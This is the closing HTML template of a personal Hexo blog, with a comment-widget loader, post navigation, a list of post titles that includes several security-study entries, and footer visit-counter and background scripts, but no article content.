    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">

    <script>
        yiliaConfig.toc = ["Hide", "Show", !!"false"];
    </script>



    
<div class="share">
    

    
        <div class="addthis_sharing_toolbox"></div>
    
</div>







        
      <section class="livere" id="comments">
    <!-- 来必力City版安装代码 -->
    <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDM3Ny8xMDkxNA==">
    <script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];

       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
       })(document, 'script');
    </script>
    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>
    <!-- City版安装代码已完成 -->
</section>
    




    <div class="scroll" id="post-nav-button">
        
            <a href="/Life/2017-films.html" title="Pre: 2017-films">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/Study/code-audit-bees4.html" title="Next: 代码审计实例-BEES_4.0_R_20160525">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/Study/ArbFileUpload.html">代码审计——任意文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/hero-vps.html">如何在vps上搭建Hexo博客</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/code-audit-mac.html">Mac下代码审计环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/docker-website.html">Docker建站——从入门到“放弃”</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-goldeneye.html">GoldenEye:1 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/amateur-ops-ctfd.html">Act as an Amateur OPS in D0g3-CTFd</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-lampião.html">Vulnhub-Lampião：1 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-lazySysAdmin.html">Vulnhub-LazySysAdmin 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/ballroom-e-youkoso.html">《Ballroom e Youkoso 舞动青春》观后感</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/feelings-xhssf.html">《西虹市首富》观后感</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/sophomore-flags.html">It's time to set Flags in Sophomore Year (持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/achievement.html">Achievements in Cyber Security</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/scff-2018.html">SCTF 2018 WriteUp & Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sql-blind.html">浅谈SQL盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/red-tiger.html">RedTiger 练习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/spider.html">How to Spider faster and faster</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/scrapy.html">Scrapy Warm-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/rapid-recurrence.html">Rapid Recurrence Of CVEs</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/privilege-escalation.html">Get Shell ->  Get Root</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/mac-settings.html">Mac Personal Settings</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/rewrite-pwnhub-subject.html">复现Pwnhub会员日的一道题</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/be-grateful.html">Being grateful for what you have</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/spider-notes.html">Python3 Web Spider Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/ctf-syb.html">CTF in ShiYanBa</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sqli-labs.html">SQL Injection - Sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sql-injection.html">SQL Injection 学习小记</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/python-notes.html">Python Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/linux-learning.html">Linux初探</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2018-books.html">My Book List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2018-films.html">My Film List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/bye2017.html">See you 2017 , Hello 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2017-films.html">2017-films</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/penetrating-courses.html">渗透课程</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/code-audit-bees4.html">代码审计实例-BEES_4.0_R_20160525</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/authentic-words.html">Authentic Words Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/php-dangerfuncts.html">PHP常见危险函数及特殊函数Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/mentohust.html">Mac下配置mentohust连接校园网/移动/联通/</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/perceptions-stave-jobs.html">Some perceptions after secondly read Steve Jobs‘s speech in Stanford</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/freshman-flags.html">It's time to set Flags in Freshman Year (完结)</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/2017-classes-ctf.html">2017班级对抗赛WP&心得</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/importance-backup.html">论Mac备份的重要性<-血的教训</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2018 KarmA
            </div>
            <div id="footer_right_div" class="footer-right" style="text-align:center;overflow:hidden;">
                <div id="web_count_div" class="post-count-bottom" style="display:inline;">
                    Follow Your Heart.
                    <i class="fa fa-heart animated infinite pulse" style="color:red;margin-left:2px;"></i><!-- 红心-->
                </div>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                    <span>| </span>
                    <span title="All Words">
                         <span><i class="fa fa-map" aria-hidden="true"></i></span>
                        <span class="post-count"><b>85.2k</b></span>
                    </span>
                
            </div>
        
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 6;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>




<div class="scroll" id="scroll">
    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
             post: ".article-entry a[href], .copyright a[href]", 
             tags: ".article-tag a", 
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  </div>
    
  <script type="text/javascript" src="/js/emoji.js"></script>
</body>
</html>